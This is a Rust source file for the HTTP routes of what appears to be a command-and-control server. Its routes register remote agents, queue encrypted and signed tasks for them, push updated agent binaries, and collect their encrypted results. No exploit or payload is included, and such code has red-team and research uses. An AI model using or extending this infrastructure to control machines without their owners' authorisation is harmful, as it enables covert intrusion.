use axum::{
    extract::State,
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, put},
    Json, Router,
};
use common::{api, crypto};
use tracing::debug;

use crate::{services, C2State};

// TODO Fix logs
// TODO Fix error system
// TODO Either encrypt all routes or listen on a different interface for admin routes

pub fn init_router() -> Router<C2State> {
    Router::new()
        .nest(
            "/agents",
            Router::new()
                .route("/", get(agents::get))
                .route("/:agent_id/update", put(agents::update_bin)),
        )
        .nest(
            "/missions",
            Router::new()
                .route("/", post(missions::create).get(missions::get_next))
                .route(
                    "/:mission_id",
                    get(missions::get_report).put(missions::report),
                ),
        )
}

mod agents {
    use axum::{body::Bytes, extract::Path};
    use tracing::error;

    use super::*;

    pub async fn get(State(c2_state): State<C2State>) -> impl IntoResponse {
        if let Ok(agents) = services::agents::get(&c2_state.conn.lock().unwrap()) {
            (StatusCode::OK, Json(agents)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    // #[axum::debug_handler]
    pub async fn update_bin(
        State(mut c2_state): State<C2State>,
        Path(agent_id): Path<i32>,
        _bin: Bytes,
    ) -> impl IntoResponse {
        let mut conn = c2_state.conn.lock().unwrap();
        // let Some(agent) = services::agents::get_by_id(&conn, agent_id) else {
        //     return (StatusCode::NOT_FOUND).into_response();
        // };
        let (public_key, private_key, _) =
            crypto::generate_key_exchange_key_pair(&mut c2_state.signing_key);
        if let Err(e) = services::missions::create(
            &mut conn,
            agent_id,
            api::Task::Update(vec![]),
            (public_key, private_key),
        ) {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
        (StatusCode::OK).into_response()
    }
}

mod missions {
    use axum::extract::Path;
    use common::api::Mission;
    use tracing::error;

    use super::*;

    pub async fn create(
        State(mut c2_state): State<C2State>,
        body: Json<Mission>,
    ) -> impl IntoResponse {
        debug!("{body:#?}");
        let (public_key, private_key, _) =
            crypto::generate_key_exchange_key_pair(&mut c2_state.signing_key);
        let mut conn = c2_state.conn.lock().unwrap();
        let mission = services::missions::create(
            &mut conn,
            body.agent_id,
            body.task.clone(),
            (public_key, private_key),
        );
        if let Ok(mission) = mission {
            (StatusCode::CREATED, Json(mission)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    pub async fn get_next(
        State(mut c2_state): State<C2State>,
        crypto_negociation: Json<api::CryptoNegociation>,
    ) -> impl IntoResponse {
        crypto_negociation.verify().unwrap();

        let mut conn = c2_state.conn.lock().unwrap();

        let agent = if let Some(agent) =
            services::agents::get_by_identity(&conn, crypto_negociation.identity.to_bytes())
        {
            agent
        } else {
            services::agents::create(
                &conn,
                "Unnamed agent",
                crypto_negociation.identity.to_bytes(),
            )
            .unwrap()
        };

        if let Some(mission) = services::missions::get_next(&mut conn, agent.id) {
            //
            let mission = if let api::Mission {
                task: api::Task::Update(_),
                ..
            } = mission
            {
                let agent_bin = std::fs::read("target/debug/agent").unwrap();
                api::Mission {
                    task: api::Task::Update(agent_bin),
                    ..mission
                }
            } else {
                mission
            };
            //
            debug!("{mission}");
            let mission = serde_json::to_vec(&mission).unwrap();

            (
                StatusCode::OK,
                Json(Some(
                    api::CryptoMessage::new(
                        &mut c2_state.signing_key,
                        crypto_negociation.public_key,
                        &mission,
                    )
                    .unwrap(),
                )),
            )
        } else {
            debug!("No mission for agent {}", agent.id);
            (StatusCode::NO_CONTENT, Json(None))
        }
    }

    pub async fn get_report(
        State(c2_state): State<C2State>,
        Path(mission_id): Path<i32>,
    ) -> impl IntoResponse {
        let conn = c2_state.conn.lock().unwrap();
        let (mission, _) = match services::missions::get_by_id(&conn, mission_id) {
            Ok(Some((m, k))) => (m, k),
            Ok(None) => {
                return (StatusCode::NOT_FOUND, "Mission not found.").into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        if mission.completed_at.is_some() {
            (StatusCode::OK, Json(mission.result)).into_response()
        } else {
            (StatusCode::NO_CONTENT).into_response()
        }
    }

    pub async fn report(
        State(c2_state): State<C2State>,
        Path(mission_id): Path<i32>,
        crypto_message: Json<api::CryptoMessage>,
    ) -> impl IntoResponse {
        let mut conn = c2_state.conn.lock().unwrap();

        let (mission, private_key) = match services::missions::get_by_id(&conn, mission_id) {
            Ok(Some((m, k))) => (m, k),
            Ok(None) => {
                return (StatusCode::NOT_FOUND, "Mission not found.").into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        let Some(agent) = services::agents::get_by_id(&mut conn, mission.agent_id) else {
            return (StatusCode::NOT_FOUND, "Agent not found.").into_response();
        };

        crypto_message
            .verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
            .unwrap();
        let decrypted_data = crypto_message.decrypt(private_key).unwrap();

        let result = String::from_utf8(decrypted_data).unwrap();
        services::missions::complete(&mut conn, mission_id, &result).unwrap();

        (StatusCode::ACCEPTED).into_response()
    }
}
